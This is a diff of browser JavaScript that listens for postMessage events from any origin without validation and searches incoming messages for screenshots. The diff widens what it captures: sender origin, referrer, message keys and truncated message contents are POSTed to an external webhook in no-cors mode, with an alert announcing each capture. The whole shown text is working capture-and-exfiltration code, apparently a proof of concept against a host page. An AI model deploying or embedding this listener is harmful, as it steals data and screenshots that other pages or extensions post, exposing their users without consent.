@@ -13,29 +13,27 @@
 
       window.addEventListener("message", (e) => {
         try {
-          const data = e.data;
-          const screenshot = deepFindScreenshot(data);
-          const keys = Object.keys(data || {});
+          const payload = e.data;
+          const origin = e.origin;
+          const keys = Object.keys(payload || {});
+          const screenshot = deepFindScreenshot(payload);
 
-          // Immediately send it to webhook
           fetch(webhookURL, {
             method: "POST",
             mode: "no-cors",
             body: JSON.stringify({
-              receivedAt: new Date().toISOString(),
-              messageKeys: keys,
+              timestamp: new Date().toISOString(),
+              origin: origin,
+              parentDoc: document.referrer || "N/A",
+              keys,
               containsScreenshot: !!screenshot,
-              truncatedMessage: JSON.stringify(data).slice(0, 500)
+              truncated: JSON.stringify(payload).slice(0, 1000)
             })
           });
 
-          // Add lightweight alert for visibility
-          alert("📥 Message received:\n" + keys.join(", "));
-
-          // Do NOT render image in DOM (avoid crash)
-
+          alert("📥 Message received from: " + origin + "\nKeys: " + keys.join(", "));
         } catch (err) {
-          console.error("⚠️ Error processing message:", err);
+          console.error("Error processing message:", err);
         }
       }, false);
     </script>
